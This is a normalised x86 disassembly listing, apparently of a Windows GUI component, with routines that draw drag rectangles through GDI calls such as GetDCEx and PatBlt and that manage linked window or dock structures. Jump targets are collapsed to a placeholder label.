mov [ edx + 0x18 ] eax
push esi
push sub_460274
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_45eaa0
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_45e728
mov eax [ esi + 0x64 ]
call sub_45e6ec
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4031ec
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_46024c
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4031ec
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_45e270
mov edx eax
mov eax edi
call sub_45e714
mov eax edi
call sub_45e574
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_460274
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_45eaa0
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_460274
mov edx [ eax + 0x14 ]
mov eax esi
call sub_45eaa0
mov eax [ ebx + 0x14 ]
call sub_4031ec
mov eax edi
call sub_4031ec
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_45fce0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_45ae78
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407f48
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_45e714
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_45ade4
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_45e714
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_4600fc
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_460274
xor edx edx
mov eax edi
call sub_45eaa0
sub_45fdbc
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_45e6ec
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_4029f0
mov edx eax
mov eax ebx
call sub_45e714
sub_45fdf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_45fe63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40423c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fe6a
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_45fe70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45ff1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45e47c
mov eax [ ebp - 0x8 ]
call sub_45fdf8
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_45fe70
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ff26
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_45fe70
pop ecx
sub_45ff2c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_460065
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_460014
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_45ade4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46001b
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_45fdf8
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_45adf8
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_46001b
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_45fe70
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46006c
lea eax [ ebp - 0x14 ]
call sub_403f7c
retn
sub_460074
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45e7c4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45e7ec
call sub_460074
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45e7c4
call sub_460074
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_45e1f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_45e6ec
mov edx eax
mov eax ebx
call sub_45e714
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_45e714
jmp r-xdata
sub_4600fc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_460074
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_460140
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_45e6ec
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_45e714
sub_460170
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_45c380
mov edx eax
mov eax [ rw-data ]
call sub_460cd0
mov eax [ ebx + 0x14 ]
call sub_45c380
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_460284
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4601d0
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_460cd0
mov eax ebx
call sub_460284
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_45e714
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_45e714
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4600fc
push ebx
push sub_460274
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_45eaa0
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_46024c
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_45ade4
test eax eax
jle r-xdata
push ebx
push sub_460274
xor edx edx
mov eax ebx
call sub_45eaa0
sub_460284
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_45e2b8
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_45e2b8
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_45e324
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_45e324
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424fa8
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_460370
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_460370
pop ecx
mov eax ebx
call sub_45e6ec
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45e6ec
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_460370
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_45e6ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42c260
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_460400
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e6ec
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_45e270
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_45e6ec
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_460370
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_460450
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_4553ec
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4553ec
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_4604cc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45e17c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_45e228
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_45e7d0
test eax eax
je r-xdata
mov eax esi
call sub_45e1f4
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_460274
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_45eaa0
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45e7d0
mov edx [ ebx + 0x20 ]
call sub_45e728
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_4604cc
pop ecx
sub_46054c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_45e1d8
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_45e1d8
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_45e7d0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_46054c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_460274
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_45eaa0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_45e3d4
mov eax edi
call sub_45e7c4
test eax eax
je r-xdata
mov eax edi
call sub_45e7d0
mov esi eax
mov eax esi
call sub_45e6ec
push eax
mov eax esi
call sub_45e228
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_45e7c4
call sub_45e6ec
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_45e6ec
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_45e714
mov eax esi
call sub_45e6ec
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_45e714
mov eax edi
call sub_45e7d0
call sub_45e764
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_45e228
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_45e714
mov eax edi
call sub_45e7c4
call sub_45e764
mov bl 0x1
jmp r-xdata
sub_460684
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45ea38
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_417744
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45f22c
test eax eax
je r-xdata
push ebp
call sub_4604cc
pop ecx
push ebp
call sub_46054c
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_460450
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_46070c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_45e2b8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_45e2b8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_460400
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_460400
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_46079c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_460b74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406c9c
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45f22c
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4601d0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406c9c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45f22c
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_455590
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b7b
lea eax [ ebp - 0x48 ]
call sub_403f7c
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_45c380
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_4542ac
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_45674c
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f7c
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_460684
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_45ae78
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_460284
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406c9c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_46070c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_460284
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406c9c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45f22c
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_45596c
jmp r-xdata
mov eax edi
call sub_472264
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45f22c
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4553ec
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_455a4c
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fd0
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_460170
jmp r-xdata
